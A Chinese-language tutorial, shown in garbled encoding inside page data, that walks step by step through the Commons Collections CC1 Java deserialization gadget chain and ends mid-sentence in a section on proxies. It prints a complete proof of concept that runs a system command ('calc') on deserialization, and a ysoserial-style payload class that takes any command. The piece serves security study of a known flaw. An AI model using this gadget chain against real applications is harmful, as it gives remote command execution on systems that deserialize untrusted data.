arIndex:2743},{level:3,title:"åè£chainedTransformer",slug:"åè£chainedtransformer",normalizedTitle:"åè£chainedtransformer",charIndex:3579},{level:3,title:"åä¸å¯»æ¾",slug:"åä¸å¯»æ¾",normalizedTitle:"åä¸å¯»æ¾",charIndex:4413},{level:2,title:"åºäºTransformedMapçCC1",slug:"åºäºtransformedmapçcc1",normalizedTitle:"åºäºtransformedmapçcc1",charIndex:12382},{level:2,title:"Javaä»£ç",slug:"javaä»£ç",normalizedTitle:"javaä»£ç",charIndex:15285},{level:3,title:"éæä»£ç",slug:"éæä»£ç",normalizedTitle:"éæä»£ç",charIndex:15414},{level:3,title:"å¨æä»£ç",slug:"å¨æä»£ç",normalizedTitle:"å¨æä»£ç",charIndex:15422},{level:2,title:"YsoserialçCC1",slug:"ysoserialçcc1",normalizedTitle:"ysoserialçcc1",charIndex:18608},{level:3,title:"LazyMap",slug:"lazymap",normalizedTitle:"lazymap",charIndex:12419},{level:3,title:"ä¸¤ä¸ªå°ç»è",slug:"ä¸¤ä¸ªå°ç»è",normalizedTitle:"ä¸¤ä¸ªå°ç»è",charIndex:22067},{level:2,title:"åèèµæ",slug:"åèèµæ",normalizedTitle:"åèèµæ",charIndex:22337}],excerpt:'<h1 id="cc1å©ç¨é¾åæ"><a class="header-anchor" href="#cc1å©ç¨é¾åæ">#</a> CC1å©ç¨é¾åæ</h1>\n<p align="center">\n  <img src="https://pic3.zhimg.com/80/v2-e8765519b71da2e4e80d93885fa7cd2e_1440w.jpg" width="500">\n</p>\n<p>CC1é¾æ¯CommonsCollectionsçç¬¬ä¸æ¡gadget Chainï¼ä¹æ¯Javaååºååçå¼ç¯ã</p>\n',headersStr:"èæ¯ å¤ç°ç¯å¢ åæ Javaæ§è¡å½ä»¤ ä½¿ç¨InvokerTRansformeræ§è¡å½ä»¤ è§£å³Runtimeä¸å¯åºååçé®é¢ åè£chainedTransformer åä¸å¯»æ¾ åºäºTransformedMapçCC1 Javaä»£ç éæä»£ç å¨æä»£ç YsoserialçCC1 LazyMap ä¸¤ä¸ªå°ç»è åèèµæ",content:'# CC1å©ç¨é¾åæ\n\n\n\nCC1é¾æ¯CommonsCollectionsçç¬¬ä¸æ¡gadget Chainï¼ä¹æ¯Javaååºååçå¼ç¯ã\n\n\n# èæ¯\n\nApache Commons Collectionsæ¯ä¸ä¸ªæ©å±äºJavaæ ååºéçCollectionç»æçç¬¬ä¸æ¹åºç¡åºãå¨ä¼ä¸é¡¹ç®åå¸¸è§çä¸­é´ä»¶ä¸­ä½¿ç¨ååçå¹¿æ³ãå¹¶ä¸ç±äºå®æ¯éåç±»çä¸ä¸ªæå±ï¼å æ­¤åéåç±»ä¼¼ï¼ä»çåæ°å¾å¾æ¯Objectç±»åï¼ååçæ¹ä¾¿æå»ºååºååå©ç¨é¾ã2015å¹´ï¼FoxGlove Securityå¢éåç°å¹¶åè¡¨äºå©ç¨Commons Collectionsè¿è¡ååºååå¯¼è´è¿ç¨å½ä»¤æ§è¡çé¿ç¯åå®¢ï¼ç±æ­¤ä¹å¼èµ·äºå½åå¤å®å¨äººåå¯¹äºJavaååºååæ¼æ´çéè§åç ç©¶ãCommonsCollections1ä½ä¸ºJavaååºååå©ç¨é¾ä¸­æåºç¡çé¾ï¼ææ¸æ¥è¿æ¡é¾çå©ç¨è¿ç¨ååçï¼å¯¹äºæ·±å¥äºè§£ååºååæ¼æ´åç ç©¶å¶ä»å©ç¨é¾æå¾å¤§çå¸®å©ã\n\n\n# å¤ç°ç¯å¢\n\nJDKçæ¬ï¼jdk8u65\n\nCommonsCollections : <= 3.2.1\n\nsunæºç ä¸è½½å°åï¼http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4\n\n> æ³¨ï¼ å ä¸ºå¨jdkçæºç ä¸­ä¸åå«sunåä¸çæºç ï¼æä»¬è¿è¡æç´¢æ¶æ¾ä¸å°sunåä¸çæºç ãå æ­¤éè¦å°sunçæºç æ·»å å°jdkç®å½ä¸çsrc.zipä¸­ã\n\n\n# åæ\n\næ ¹æ®FoxGlove Securityçåå®¢ï¼CC1é¾è½å¤æåå©ç¨æ¯å ä¸ºå¨Transformer(æ¥å£)çå®ç°ç±»InvokerTransformerä¸­çtransformæ¹æ³ä¸­ä½¿ç¨åå°è¿è¡è¿è¡ç±»çåå»ºåæ¹æ³çè°ç¨ï¼å¹¶ä¸æä»¬å¯ä»¥æ§å¶è°ç¨æ¹æ³çåç§°ãåæ°åä¼ å¥çç±»çå¯¹è±¡ãå¦ä¸ä»£ç æç¤ºï¼\n\npublic Object transform(Object input) {\n    if (input == null) {\n        return null;\n    }\n    try {\n        Class cls = input.getClass();\n        Method method = cls.getMethod(iMethodName, iParamTypes);\n        return method.invoke(input, iArgs);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\né£ä¹æä»¬å°±ä»è¿éå¥æï¼ä¸æ­¥ä¸æ­¥åæ¨å°å©ç¨é¾çå¼å§ä½ç½®ï¼readObject\n\n\n# Javaæ§è¡å½ä»¤\n\nå¨Javaä¸­æä¸ç§æ§è¡ç³»ç»å½ä»¤çæ¹å¼ï¼åå«æ¯Runtime.getRuntime.execãProcessBuilderåProcessImplãProcessImplæ¹å¼æ¯åä¸¤ç§æ¹å¼çåºå±å®ç°ï¼å¹¶ä¸æä¾ç»ç¨æ·è°ç¨ï¼ä½æ¯æä»¬å¯ä»¥å©ç¨åå°æ¥è°ç¨æ§è¡ç³»ç»çå½ä»¤ãå¨è¿ç¯æç« ä¸­å°±ä½¿ç¨æç®åçRuntimeæ¥æ§è¡å½ä»¤ã\n\nå¨æ­£å¸¸æåµä¸ï¼æä»¬ä½¿ç¨å¦ä¸çå½ä»¤æ¥æ§è¡å½ä»¤ï¼\n\nRuntime.getRuntime().exec("calc");\n\n\n1\n\n\nè¿éä½¿ç¨Runtimeçéææ¹æ³getRuntimeæ¹æ³è·åå°ä¸ä¸ªRuntimeå¯¹è±¡ï¼ç¶åè°ç¨execæ¹æ³ï¼æ§è¡execæ¹æ³ä¸­çå½ä»¤ï¼æå¼ä¸ä¸ªè®¡ç®å¨ãä¹æä»¥ä¸ç¨newç´æ¥åå»ºå¯¹è±¡ï¼åRuntimeçåä¾æ¨¡å¼æå³ç³»ãå¨Runtimeç±»ä¸­ï¼æé å¨ä¸ºç§æçï¼åªæä¾äºä¸ä¸ªgetRuntimeæ¹æ³è·åå¯¹è±¡ãå½ç¶æä»¬ä¹å¯ä»¥ä½¿ç¨åå°æ¥åå»ºå¯¹è±¡ï¼è¿éå°±ä¸åè¯´æäºã\n\nç±äºæä»¬éè¦å©ç¨transformæ¹æ³ä¸­çåå°æ¥æ§è¡ç³»ç»å½ä»¤ï¼å æ­¤æä»¬å°ä¸é¢çåæ³ç¨Javaåå°å®ç°ï¼\n\nClass<Runtime> clazz = Runtime.class;\nMethod getRuntimeMethod = clazz.getMethod("getRuntime");\nRuntime runtime = (Runtime) getRuntimeMethod.invoke(null, null);\nMethod execMethod = clazz.getMethod("exec", String.class);\nexecMethod.invoke(runtime,"calc");\n\n\n1\n2\n3\n4\n5\n\n\nå·ä½ä¸ºä»ä¹è¦è¿ä¹åï¼å¨å¦ä¸ç¯ãjavaååºåå - åå°ãçæç« ä¸­æè¯´æï¼è¿éä¸å¨ä»ç»ã\n\n\n# ä½¿ç¨InvokerTRansformeræ§è¡å½ä»¤\n\npublic Object transform(Object input) {\n    if (input == null) {\n        return null;\n    }\n    try {\n        Class cls = input.getClass();\n        Method method = cls.getMethod(iMethodName, iParamTypes);\n        return method.invoke(input, iArgs);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nå¨InvokerTransformerç±»çtransformæ¹æ³ä¸­ï¼inputæ¯æä»¬ä¼ å¥çæ³è¦åå°çç±»ï¼éè¿getClassè·åå°ç±»å¯¹è±¡ãç¶åè°ç¨getMethodæ¹æ³ï¼ä¼ å¥æ¹æ³åç§°ãåæ°ç±»åï¼æåè°ç¨æ¹æ³çinvokeï¼ä¼ å¥æ§è¡æ¹æ³çå¯¹è±¡ãæ¹æ³çåæ°æ§è¡è¯¥æ¹æ³ãå¶ä¸­æ¹æ³åç§°ãåæ°ç±»åãåæ°åå¯ä»¥å¨åå»ºInvokerTransformerå¯¹è±¡æ¶ï¼ä½¿ç¨æé å¨è®¾ç½®ãå¯¹ç§ä¸é¢æä»¬èªå·±ç¼åçåå°æ§è¡ç³»ç»å½ä»¤çåæ³ï¼æä»¬ç¥éinputæ¯Runtimeçå¯¹è±¡ï¼iMethodNameæ¯execï¼iParamTypesæ¯String.classï¼iArgsæ¯calcãäºæ¯æä»¬å°±æäºå¦ä¸çåæ³ï¼\n\nInvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});\nClass clazz = Runtime.class;\nMethod getRuntime = clazz.getMethod("getRuntime");\nRuntime runtime = (Runtime) getRuntime.invoke(null);\ninvokerTransformer.transform(runtime);\n\n\n1\n2\n3\n4\n5\n\n\n\n# è§£å³Runtimeä¸å¯åºååçé®é¢\n\næ³è¦åºååä¸ä¸ªç±»ï¼éè¦è¿ä¸ªç±»å®ç°Serializableæ¥å£ï¼Runtimeæ²¡æå®ç°è¯¥æ¥å£ï¼å æ­¤æ æ³è¿è¡åºååï¼æç»å¯¼è´æ æ³è¿è¡å½ä»¤æ§è¡ãå æ­¤ï¼æä»¬éè¦å¯¹Runtimeçåæ³è¿è¡æ¹é ï¼\n\nClass<Runtime> clazz = Runtime.class;\nMethod runtimeMethod = (Method) new InvokerTransformer(\n    "getMethod",\n    new Class[]{String.class,Class[].class},\n    new Object[]{"getRuntime",null})\n    .transform(clazz);\nRuntime runtime =(Runtime) new InvokerTransformer(\n    "invoke",\n    new Class[]{Object.class, Object[].class},\n    new Object[]{null,null})\n    .transform(runtimeMethod);\nnew InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}).transform(runtime);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\nä¼ å¥çClassç±»å¯¹è±¡æ¯å¯ä»¥è¢«ååºååçï¼å æ­¤ä¼ å¥Runtimeçç±»å¯¹è±¡ï¼å©ç¨åå°è°ç¨ç±»å¯¹è±¡çgetMethodæ¹æ³ï¼è·åå°è¯¥æ¹æ³ä¹åï¼å¨å©ç¨åå°è°ç¨getRuntimeæ¹æ³å¯¹è±¡çinvokeæ¹æ³ï¼è·åå°Runtimeå¯¹è±¡ãæåå¨å©ç¨InvokerTransformerè°ç¨execæ¹æ³ï¼è°ç¨ç³»ç»å½ä»¤ãè¿ç§æ¹æ³ååå·§å¦çè§£å³äºRuntimeå¯¹è±¡æ æ³åºååçé®é¢ï¼è¿ç§åæ³å¨åç»­çååºååé¾ä¸­ä¹ååå¸¸è§ã\n\n\n# åè£chainedTransformer\n\næä»¬ä¸é¢çåæ³åå»ºäºä¸ä¸ªInvokerTransformerå¯¹è±¡ï¼éè¦æ¯ä¸ªé½æ§è¡ä»çtransformæ¹æ³ï¼è¿æ ·è¿äºéº»ç¦ãTransformeræ¥å£è¿æä¸ä¸ªå®ç°ç±»ChainedTransformerï¼è¯¥ç±»å¯ä»¥å°Transformerå¯¹è±¡æ°ç»åè£æä¸ä¸ªchainedTransformerï¼è°ç¨transformæ¹æ³æ¶ï¼ä¼é¾å¼è°ç¨æ¯ä¸ªTransformerå¯¹è±¡çtransformæ¹æ³ãå¦ä¸å¾æç¤ºï¼\n\n\n\nå æ­¤ï¼å¯¹æä»¬ç¼åçä»£ç è¿è¡åè£ï¼ç¶åè°ç¨transformæ¹æ³ï¼æ§è¡çç»æåä¸é¢ä¸è´ï¼\n\nTransformer[] transformers = new Transformer[]{\n    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),\n    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),\n    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})\n};\n\nChainedTransformer chainedTransformer = new ChainedTransformer(transformers);\n\nchainedTransformer.transform(Runtime.class);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nå°è¿ä¹åï¼æä»¬åºæ¬çTransformerå°±ç®æå»ºå®æäºï¼æä»¬éè¦ç½ä¸å¯»æ¾åªéè°ç¨è¿transformæ¹æ³ã\n\n\n# åä¸å¯»æ¾\n\nå¯ä»¥å©ç¨IdeaçFind Usagesæ¾å°ç°æçJavaæºç ä¸­è°ç¨è¿è¯¥æ¹æ³çä½ç½®ï¼è¿ä¹æ¯ä¸ºä»ä¹æä»¬éè¦å°sunåä¸çæºç æ¾å¥jdkç®å½ä¸çsrc.zipä¸­ãå¦ææ²¡æsunçæºç ï¼åé¢è¿æ¡é¾å°±ä¼æ­æã\n\n\n\nå¨æ¥æ¾çç»æä¸­ï¼æä»¬åç°org.apache.commons.collections.map.TransformedMapç±»ä¸çcheckSetValueæ¹æ³çvalueTransformerå¯¹è±¡è°ç¨äºtransformæ¹æ³ã\n\nprotected Object checkSetValue(Object value) {\n    return valueTransformer.transform(value);\n}\n\n\n1\n2\n3\n\n\nèvalueTransformerå¯¹è±¡æ¯æä»¬å¯ä»¥æ§å¶çãä¹å°±æ¯è¯´ï¼å¦ævalueTransformerå¯¹è±¡æ¯æä»¬åå»ºçchainedTransformerå¯¹è±¡ï¼è°ç¨transformæ¹æ³å°±å¯ä»¥æ§è¡ç³»ç»å½ä»¤äºãæä»¬åæ¥çä¸ä¸valueTransformerä»åªéæ¥çã\n\nprotected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) {\n    super(map);\n    this.keyTransformer = keyTransformer;\n    this.valueTransformer = valueTransformer;\n}\n\n\n1\n2\n3\n4\n5\n\n\nå¨è¿ä¸ªç±»çæé å¨ä¸­ï¼valueTransformeræ¯ç±æä»¬ä¼ å¥çï¼é£ä¹æä»¬æ¯ä¸æ¯å°±å¯ä»¥è°ç¨æé å¨ç´æ¥æchainedTransformerçå¼èµå¼ç»valueTransformerå¢ï¼æ¯ä¸è¡çï¼å ä¸ºè¿ä¸ªæé å¨æ¯protectedçï¼æä»¬æ²¡æåæ³ç´æ¥è¿è¡è°ç¨ãé£ä¹æä»¬å°±çä¸çï¼æ¯è°è°ç¨äºè¿ä¸ªæé å¨ã\n\næä»¬æ¾å°ï¼å¨è¿ä¸ªç±»ä¸­å­å¨ä¸ä¸ªpublic çéææ¹æ³ï¼å¯ä»¥ä½¿ç¨ç±»åç´æ¥è°ç¨ï¼decorateãæä»¬ä¼ å¥è¯¥æ¹æ³çvalueTransformeråæ°ï¼å°ç´æ¥å¸¦å¥å°æé å¨ä¸­ã\n\npublic static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {\n    return new TransformedMap(map, keyTransformer, valueTransformer);\n}\n\n\n1\n2\n3\n\n\näºæ¯æä»¬å¯ä»¥è¿æ ·è¿è¡æå»ºï¼\n\nHashMap<Object, Object> map = new HashMap<>();\nmap.put("aaa","bbb");\nMap<Object,Object> decoratedMap = TransformedMap.decorate(map, null, chainedTransformer);\n\n\n1\n2\n3\n\n\nè¿æ ·æä»¬å°±å°decoratedMapå¯¹è±¡ä¸­çchainedTransformerå¯¹è±¡èµå¼ä¸ºäºchainedTransformerãå½chainedTransformerè°ç¨transformæ¹æ³ï¼å®éä¸å°±æ¯chainedTransformerè°ç¨transformæ¹æ³ï¼å°±ä¼å¼¹åºè®¡ç®å¨ã\n\näºæ¯æä»¬ç»§ç»­åä¸æ¾ï¼åªéè°ç¨äºcheckSetValueæ¹æ³ã\n\nå¨org.apache.commons.collections.map.TransformedMapç±»çç¶ç±»ä¸­æä¸ä¸ªéæåé¨ç±»ï¼å½æä»¬ä½¿ç¨foreachå¾ªç¯éåMapçentityå¹¶ç»entityè®¾ç½®å¼æ¶ä¼è°ç¨checkSetValueæ¹æ³ãsetValueçåæ°æ¯Objectç±»åçå¯¹è±¡ï¼è¯¥å¼ä¼ä¼ éç»checkSetValueæ¹æ³ï¼æåä¼ éç»transformæ¹æ³ã\n\nstatic class MapEntry extends AbstractMapEntryDecorator {\n\n    /** The parent map */\n    private final AbstractInputCheckedMapDecorator parent;\n\n    protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) {\n        super(entry);\n        this.parent = parent;\n    }\n\n    public Object setValue(Object value) {\n        value = parent.checkSetValue(value);\n        return entry.setValue(value);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\näºæ¯æä»¬å¯ä»¥è¿æ ·æé ï¼éåè£é¥°è¿çchainedTransformerå¯¹è±¡ãå¹¶ä¸è°ç¨setValueæ¹æ³ãå°±å¯ä»¥è°ç¨å°tansfromæ¹æ³ã\n\nfor (Map.Entry entry : decoratedMap.entrySet()){\n    entry.setValue(Runtime.class);\n}\n\n\n1\n2\n3\n\n\nè³æ­¤ï¼æä»¬å·²ç»å®æäºå¤§é¨åçå©ç¨é¾çå¯»æ¾ï¼ä¸ä¸æ­¥å°±æ¯å¯»æ¾åªéè°ç¨è¿setValueï¼å¹¶ä¸å¯ä»¥æ§å¶ä¼ å¥çåæ°ãæå¥½æ¯readObjectè°ç¨è¿ï¼è¿æ ·å¨è¿è¡ååºååçæ¶åå°±å¯ä»¥ç´æ¥æ¿æ´»æ´æ¡å©ç¨é¾äºã\n\næä»¬ä¾ç¶ä½¿ç¨IdeaçFind Usageså¯»æ¾ï¼æç»å¨sunåä¸çsun.reflect.annotation.AnnotationInvocationHandlerçreadObjectæ¹æ³ä¸­è°ç¨äºsetValueæ¹æ³ã\n\nprivate void readObject(java.io.ObjectInputStream s)\n    throws java.io.IOException, ClassNotFoundException {\n    s.defaultReadObject();\n\n    // Check to make sure that types have not evolved incompatibly\n\n    AnnotationType annotationType = null;\n    try {\n        annotationType = AnnotationType.getInstance(type);\n    } catch(IllegalArgumentException e) {\n        // Class is no longer an annotation type; time to punch out\n        throw new java.io.InvalidObjectException("Non-annotation type in annotation serial stream");\n    }\n\n    Map<String, Class<?>> memberTypes = annotationType.memberTypes();\n\n    // If there are annotation members without values, that\n    // situation is handled by the invoke method.\n    for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {\n        String name = memberValue.getKey();\n        Class<?> memberType = memberTypes.get(name);\n        if (memberType != null) {  // i.e. member still exists\n            Object value = memberValue.getValue();\n            if (!(memberType.isInstance(value) ||\n                  value instanceof ExceptionProxy)) {\n                memberValue.setValue(\n                    new AnnotationTypeMismatchExceptionProxy(\n                        value.getClass() + "[" + value + "]").setMember(\n                        annotationType.members().get(name)));\n            }\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\nå¶ä¸­çmemberValuesæ¯å¯ä»¥éè¿æé æ¹æ³ä¼ éè¿å»çãä½æ¯AnnotationInvocationHandlerç±»å¹¶épublicï¼ä¹æ æ³ç´æ¥è·åå¯¹è±¡ï¼æä»¬éè¦ä½¿ç¨åå°è·åå°è¯¥ç±»çå¯¹è±¡ãå¨æé å¨ä¸­ä¼ å¥ä¸ä¸ªæ³¨è§£ç±»åçç±»å¯¹è±¡ï¼åæä»¬ä¸é¢æé çdecoratedMapï¼å¨ååºååçæ¶åå°±ä¼è°ç¨è¯¥ç±»çreadObjectæ¹æ³ï¼éådecoratedMapï¼è°ç¨setValueã\n\nClass<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");\nConstructor<?> declaredConstructor = clazz.getDeclaredConstructor(Class.class, Map.class);\ndeclaredConstructor.setAccessible(true);\nObject o = declaredConstructor.newInstance(Overide.class, decoratedMap);\n\ndeserialize(o,"test.ser");\nObject serialize = serialize("test.ser");\nSystem.out.println(serialize);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nä½æ¯æä¸¤ç¹éè¦æ³¨æçæ¯ï¼\n\n 1. å½ifå¤æ­éè¿åæè½æ§è¡\n 2. setValueçå¼æä»¬å¹¶ä¸å¯æ§ï¼å¹¶ä¸è½ä¼ å¥Runtime.class\n\næä»¬åçä¸ä¸ifå¤æ­çé®é¢ï¼ifå¤æ­memberTypeä¸ç­äºnullæ¶æç»§ç»­æ§è¡ãmemberTypeçå¼çè·åæ¹å¼æ¯:\n\n1. è·åæä»¬ä¼ å¥çmapçkey -- è¿éæ¯ aaa\n2. ç¶åè·åæä»¬ä¼ å¥çæ³¨è§£ç±»çååå¼ --- Overrideä¸­æ²¡æåæ° å æ­¤è·åä¸å°\n3. ç¶åå¤æ­è·åå°çmemberTypeæ¯ä¸æ¯ç©ºç --- æ¯ç©ºç äºæ¯æ§è¡ä¸å°setVlaue\n\n\n1\n2\n3\n\n\näºæ¯æä»¬éè¦å°æåçHashMapä¸­çaaaä¿®æ¹ä¸ºä¸ä¸ªæ³¨è§£ä¸­å­å¨çå¼ï¼ç±äºOverideä¸å­å¨ä»»ä½çå±æ§ï¼å æ­¤æä»¬ä¿®æ¹ä½¿ç¨Targetæ³¨è§£ã\n\nâ¦â¦\nmap.put("value","bbb");\nâ¦â¦\nObject o = declaredConstructor.newInstance(Target.class, decoratedMap);\n\n\n1\n2\n3\n4\n\n\nè¿æ ·çè¯ï¼ifå¤æ­å°±å¯ä»¥éè¿äºã\n\nç°å¨æ¥è§£å³ç¬¬äºä¸ªé®é¢ï¼æä»¬æ æ³æ§å¶setValueçåæ°ãsetValueçåæ°æ¯Runtime.classç±»å¯¹è±¡ï¼æç»éè¦ä¼ éç»transformæ¹æ³ãæä»¬æ æ³æ§å¶çè¯ï¼å°±æ æ³æ§è¡å½ä»¤ãè§£å³æ¹æ³å¦ä¸ï¼\n\nTransformeræ¥å£æå¦ä¸ä¸ªå®ç°ç±»ï¼org.apache.commons.collections.functors.ConstantTransformer\n\nè¯¥ç±»å¨åå»ºæ¶éè¦ä¼ éè¿å»ä¸ä¸ªObjectç±»åçåæ°ï¼å¨æ§è¡å®è¯¥ç±»çtransformæ¹æ³ä¹åï¼ä¼å°æä»¬ä¼ éè¿å»çåæ°è¿åãå¦æå°å¶ç½®äºchainedTransformeræåé¢ï¼åç»­çtransfromæ¹æ³çåæ°é½å°æ¯æä»¬è®¾ç½®çObjectç±»åçåæ°ã\n\nTransformer[] transformers = new Transformer[]{\n    new ConstantTransformer(Runtime.class),\n    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),\n    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),\n    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})\n};\n\n\n1\n2\n3\n4\n5\n6\n\n\nè§£å³äºä¸é¢ä¸¤ä¸ªé®é¢ï¼å¨å¯¹æç»çå¯¹è±¡è¿è¡ååºååæ¶ï¼å°±ä¼è°ç¨è¯¥å¯¹è±¡çreadObjectæ¹æ³ï¼ç¶åè°ç¨åç»­çä¸ç³»åæ¹æ³ï¼æç»æ§è¡ç³»ç»å½ä»¤ãå®æ´çpocå¦ä¸ï¼\n\npublic class CC1 {\n    public static void main(String[] args) throws Exception {\n        Transformer[] transformers = new Transformer[]{\n            new ConstantTransformer(Runtime.class),\n            new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),\n            new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),\n            new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})\n        };\n\n        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);\n        HashMap<Object, Object> map = new HashMap<>();\n        map.put("value","bbb");\n        Map<Object,Object> decoratedMap = TransformedMap.decorate(map, null, chainedTransformer);\n        for (Map.Entry entry : decoratedMap.entrySet()){\n            entry.setValue(Runtime.class);\n        }\n\n        Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");\n        Constructor<?> declaredConstructor = clazz.getDeclaredConstructor(Class.class, Map.class);\n        declaredConstructor.setAccessible(true);\n        Object o = declaredConstructor.newInstance(Target.class, decoratedMap);\n\n        deserialize(o,"test.ser");\n        Object serialize = serialize("test.ser");\n        System.out.println(serialize);\n\n    }\n\n    private static void deserialize(Object o,String fileName) throws Exception{\n        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(fileName));\n        objectOutputStream.writeObject(o);\n    }\n\n    private static Object serialize(String fileName) throws Exception{\n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(fileName));\n        return ois.readObject();\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n\n\næä»¬åæ¥æ¢³çä¸ä¸è°ç¨é¾ï¼\n\n- ç³»ç»å­å¨ä¸ä¸ªååºååç¹\n\t- ä¼ éæä»¬æé çå¯¹è±¡ï¼ è°ç¨å¯¹è±¡çreadObjectæ¹æ³è¿è¡ååºåå\n\t\t- readObjectä¸­è°ç¨äºsetValueæ¹æ³\n\t\t\t- setValueæ¹æ³ä¸­è°ç¨äºcheckSetValueæ¹æ³\n\t\t\t\t- checkSetValueæ¹æ³ä¸­è°ç¨transform\n\t\t\t\t\t- transformæ¹æ³ä¸­å©ç¨åå°æ§è¡ç³»ç»å½ä»¤\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# åºäºTransformedMapçCC1\n\nå¨ysoserialä¸­ä½¿ç¨çæ¶LazyMapï¼æ¬è´¨ä¸åæä»¬è¿ä¸ªç±»ä¼¼ãå¹¶ä¸å¨ysoserialä¸­å¤§éçä½¿ç¨å°äºå°è£ã\n\nfinal Map lazyMap = LazyMap.decorate(innerMap, transformerChain);\n\n\n1\n\n\næä»¬å¯ä»¥å°æä»¬è¿ä¸ªé¾ä¹ç¨ysoserialçæ¹å¼å®ç°ä¸éã\n\npackage ysoserial.payloads;\n\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.map.LazyMap;\nimport org.apache.commons.collections.map.TransformedMap;\nimport ysoserial.payloads.annotation.Authors;\nimport ysoserial.payloads.annotation.Dependencies;\nimport ysoserial.payloads.annotation.PayloadTest;\nimport ysoserial.payloads.util.Gadgets;\nimport ysoserial.payloads.util.JavaVersion;\nimport ysoserial.payloads.util.PayloadRunner;\n\nimport java.lang.annotation.Target;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.InvocationHandler;\nimport java.util.HashMap;\nimport java.util.Map;\n\n@SuppressWarnings({"rawtypes", "unchecked"})\n@PayloadTest( precondition = "isApplicableJavaVersion")\n@Dependencies({"commons-collections:commons-collections:3.1"})\n@Authors({ Authors.FROHOFF })\npublic class CC1 extends PayloadRunner implements ObjectPayload<InvocationHandler> {\n\n\n  @Override\n  public InvocationHandler getObject(final String command) throws Exception {\n\n\n    final Transformer[] transformers = new Transformer[]{\n      new ConstantTransformer(Runtime.class),\n      new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),\n      new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),\n      new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{command})\n    };\n    final Map innerMap = new HashMap();\n    innerMap.put("value","123");\n\n    final Transformer transformerChain = new ChainedTransformer(transformers);\n\n    final Map transformedMap = TransformedMap.decorate(innerMap, null ,transformerChain);\n\n    Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");\n    Constructor<?> declaredConstructor = clazz.getDeclaredConstructor(Class.class, Map.class);\n    declaredConstructor.setAccessible(true);\n    final InvocationHandler handler = (InvocationHandler) declaredConstructor.newInstance(Target.class, transformedMap);\n\n    return handler;\n  }\n\n\n\n  public static void main(final String[] args) throws Exception {\n    PayloadRunner.run(CommonsCollections1.class, args);\n  }\n\n  public static boolean isApplicableJavaVersion() {\n    return JavaVersion.isAnnInvHUniversalMethodImpl();\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n\n\nç¶åæä»¬å°±å¯ä»¥ä½¿ç¨ysoserialåå»ºåºååæä»¶äºã\n\n\n# Javaä»£ç\n\nä»£çè®¾è®¡æ¨¡å¼æ¯Javaä¸­éå¸¸å¸¸ç¨çè®¾è®¡æ¨¡å¼ä¹ä¸ãæè°ä»£çè®¾è®¡æ¨¡å¼ï¼å°±æ¯å®¢æ·ç«¯å¹¶ä¸ç´æ¥è°ç¨å®éçæ¹æ³ï¼èæ¯çæè¯¥ç±»çä»£çå¯¹è±¡ï¼è°ç¨ä»£çå¯¹è±¡çæå®æ¹æ³ï¼ç¶ååç±ä»£çå¯¹è±¡å»è°ç¨å®éçå¯¹è±¡ãç±»ä¼¼äºä¸­é´åã\n\n\n\nä»£çè®¾è®¡æ¨¡å¼æä¸¤ç§å®ç°æ¹å¼ï¼\n\n * éæä»£ç\n * å¨æä»£ç\n\n\n# éæä»£ç\n\néæä»£ççå®ç°åçæ¯ï¼åå»ºä¸ä¸ªæ¥å£ç±»ï¼è®©å®é